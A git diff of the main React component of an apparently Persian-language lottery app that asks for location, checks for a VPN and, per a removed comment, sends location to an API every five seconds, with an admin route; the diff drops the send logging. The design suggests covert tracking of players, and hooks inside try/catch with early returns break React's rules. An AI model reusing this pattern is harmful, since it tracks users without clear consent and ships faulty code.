@@ -14,6 +14,36 @@ type AppState = "location-request" | "vpn-check" | "lottery-game";
 function App() {
   const [appState, setAppState] = useState<AppState>("location-request");
   const [locationTips, setLocationTips] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState(true);
+
+  // Initialize hooks with error handling
+  let locationHook, vpnHook, locationAPI;
+
+  try {
+    locationHook = useLocation();
+    vpnHook = useVPN();
+    locationAPI = useLocationAPI(
+      locationHook.location,
+      locationHook.isWatching
+    );
+  } catch (error) {
+    console.error("Hook initialization error:", error);
+    return (
+      <div className="min-h-screen bg-red-900 flex items-center justify-center text-white">
+        <div className="text-center">
+          <h1 className="text-2xl font-bold mb-4">خطا در بارگذاری برنامه</h1>
+          <p>مشکلی در بارگذاری برنامه پیش آمده است.</p>
+          <button
+            onClick={() => window.location.reload()}
+            className="mt-4 px-4 py-2 bg-white text-red-900 rounded"
+          >
+            بارگذاری مجدد
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   const {
     location,
     error: locationError,
@@ -22,17 +52,19 @@ function App() {
     hasPermission,
     isWatching,
     getLocationTips,
-  } = useLocation();
+  } = locationHook;
 
   const {
     vpnStatus,
     checking: vpnChecking,
     error: vpnError,
     checkVPN,
-  } = useVPN();
+  } = vpnHook;
 
-  // Use the location API hook to send data every 5 seconds
-  const locationAPI = useLocationAPI(location, isWatching);
+  // Set loading to false after hooks are initialized
+  useEffect(() => {
+    setIsLoading(false);
+  }, []);
 
   // Register service worker
   useEffect(() => {
@@ -47,23 +79,9 @@ function App() {
         })
         .catch((registrationError) => {
           console.log("SW registration failed: ", registrationError);
-          // Don't throw error, just log it
         });
     }
   }, []);
-
-  // Log location API status
-  useEffect(() => {
-    if (locationAPI.isSending) {
-      console.log("Sending location data to API...");
-    }
-    if (locationAPI.lastSent) {
-      console.log("Location data sent at:", locationAPI.lastSent);
-    }
-    if (locationAPI.error) {
-      console.error("Location API error:", locationAPI.error);
-    }
-  }, [locationAPI.isSending, locationAPI.lastSent, locationAPI.error]);
 
   // Load location tips
   useEffect(() => {
@@ -106,7 +124,6 @@ function App() {
       await requestLocation();
     } catch (error) {
       console.error("Error requesting location:", error);
-      // Error is already handled by the useLocation hook
     }
   };
 
@@ -123,9 +140,20 @@ function App() {
     }
   };
 
-  // Main lottery app component
-  const LotteryApp = () => {
-    // Render based on current state
+  // Show loading screen
+  if (isLoading) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-blue-900 to-purple-900 flex items-center justify-center">
+        <div className="text-white text-center">
+          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto mb-4"></div>
+          <p>در حال بارگذاری...</p>
+        </div>
+      </div>
+    );
+  }
+
+  // Render based on current state
+  const renderContent = () => {
     switch (appState) {
       case "location-request":
         return (
@@ -171,9 +199,9 @@ function App() {
 
   return (
     <Routes>
-      <Route path="/" element={<LotteryApp />} />
+      <Route path="/" element={renderContent()} />
       <Route path="/admin" element={<AdminLayout />} />
-      <Route path="*" element={<LotteryApp />} />
+      <Route path="*" element={renderContent()} />
     </Routes>
   );
 }
